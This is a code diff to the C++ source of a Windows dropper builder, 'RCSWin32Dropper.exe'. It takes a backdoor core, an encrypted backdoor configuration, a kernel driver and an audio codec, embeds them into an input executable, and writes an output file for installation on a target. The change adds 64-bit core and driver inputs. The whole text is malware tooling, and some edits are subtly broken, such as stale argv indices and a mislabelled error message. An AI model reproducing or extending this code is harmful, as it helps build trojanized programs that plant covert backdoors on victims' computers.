@@ -31,12 +31,14 @@ int main(int argc, char* argv[])
 	memset(&MS, 0, sizeof(MelterStruct));
 	MS.manifest = false;
 	
-	if (argc != 9) {
+	if (argc != 11) {
 		printf("ERROR: \n");
-		printf("  usage:  RCSWin32Dropper.exe  <core> <conf> <driver> <codec> <instdir> <manifest> <input> <output>\n\n");
+		printf("  usage:  RCSWin32Dropper.exe  <core> <core64> <conf> <driver> <driver64> <codec> <instdir> <manifest> <input> <output>\n\n");
 		printf("  <core> is the backdoor core\n");
+		printf("  <core64> is the 64 bit backdoor core\n");
 		printf("  <conf> is the backdoor encrypted configuration\n");
 		printf("  <driver> is the kernel driver\n");
+		printf("  <driver64> is the 64 bit kernel driver\n");
 		printf("  <codec> is the audio codec\n");
 		printf("  <instdir> is the backdoor install directory (on the target)\n");
 		printf("  <manifest> is a boolean flag for modifying the manifest\n");
@@ -53,30 +55,37 @@ int main(int argc, char* argv[])
 		printf("%s\n", argv[i]);
 	
 	sprintf(MS.core, "%s", argv[1]);
-
-	printf("%s %s\n", argv[1], MS.core);
-
-	sprintf(MS.conf, "%s", argv[2]);
-	if (strcmp(argv[3], "null")) {
+	sprintf(MS.conf, "%s", argv[3]);
+	
+	if (strcmp(argv[2], "null")) {
+		sprintf(MS.core64, "%s", argv[2]);
+	}
+	
+	if (strcmp(argv[4], "null")) {
 		sprintf(MS.driver, "%s", argv[3]);
 	}
-	if (strcmp(argv[4], "null")) {
+
+	if (strcmp(argv[5], "null")) {
+		sprintf(MS.driver64, "%s", argv[5]);
+	}
+
+	if (strcmp(argv[6], "null")) {
 		sprintf(MS.codec, "%s", argv[4]);
 	}
-	printf("Instdir = %s\n", argv[5]);
-	sprintf(MS.instdir, "%s", argv[5]);
+	printf("Instdir = %s\n", argv[7]);
+	sprintf(MS.instdir, "%s", argv[7]);
 
-	printf("%s %s\n", argv[5], MS.instdir);
-
-	if (!strcmp(argv[6], "1") )
+	if (!strcmp(argv[8], "1") )
 		MS.manifest = true;
 	
-	bf::path coreFile = argv[1];
-	bf::path configFile = argv[2];
-	bf::path driverFile = argv[3];
-	bf::path codecFile = argv[4];
-	bf::path exeFile = argv[7];
-	bf::path outputFile = argv[8];
+	bf::path coreFile = MS.core;
+	bf::path core64File = MS.core64;
+	bf::path configFile = MS.conf;
+	bf::path driverFile = MS.driver;
+	bf::path driver64File = MS.driver64;
+	bf::path codecFile = MS.codec;
+	bf::path exeFile = argv[9];
+	bf::path outputFile = argv[10];
 	
 	/************************************************************************/
 	/*  SANITY CHECKS                                                       */
@@ -97,9 +106,23 @@ int main(int argc, char* argv[])
 		return ERROR_EMBEDDING;
 	}
 
+	if (MS.core64[0]) {
+		if ( !bf::exists(core64File) ) {
+			cout << "Cannot find the driver file [" << core64File << "]" << endl;
+			return ERROR_EMBEDDING;
+		}
+	}
+
 	if (MS.driver[0]) {
 		if ( !bf::exists(driverFile) ) {
 			cout << "Cannot find the driver file [" << driverFile << "]" << endl;
+			return ERROR_EMBEDDING;
+		}
+	}
+
+	if (MS.driver64[0]) {
+		if ( !bf::exists(driver64File) ) {
+			cout << "Cannot find the driver file [" << driver64File << "]" << endl;
 			return ERROR_EMBEDDING;
 		}
 	}
@@ -116,14 +139,16 @@ int main(int argc, char* argv[])
 	/************************************************************************/
 	
 	printf("Ready to go...\n");
-	printf("CORE          [%s]\n", MS.core);
-	printf("CONFIGURATION [%s]\n", MS.conf);
-	printf("INSTALL DIR   [%s]\n", MS.instdir);
-	printf("DRIVER        [%s]\n", (MS.driver) ? MS.driver : "null");
-	printf("CODEC         [%s]\n", (MS.codec) ? MS.codec : "null");
-	printf("MANIFEST      [%d]\n", MS.manifest);
-	cout << "INPUT         [" << exeFile << "]" << endl;
-	cout << "OUTPUT        [" << outputFile << "]" << endl << endl;
+	printf("CORE (32 bit)   [%s]\n", MS.core);
+	printf("CORE (64 bit)   [%s]\n", (MS.core64) ? MS.core64 : "none");
+	printf("CONFIGURATION   [%s]\n", MS.conf);
+	printf("INSTALL DIR     [%s]\n", MS.instdir);
+	printf("DRIVER (32 bit) [%s]\n", (MS.driver) ? MS.driver : "none");
+	printf("DRIVER (64 bit) [%s]\n", (MS.driver64) ? MS.driver64 : "none");
+	printf("CODEC           [%s]\n", (MS.codec) ? MS.codec : "none");
+	printf("MANIFEST        [%d]\n", MS.manifest);
+	cout << "INPUT          [" << exeFile << "]" << endl;
+	cout << "OUTPUT         [" << outputFile << "]" << endl << endl;
 	
 	if ( bf::exists(outputFile) )
 		bf::remove(outputFile);
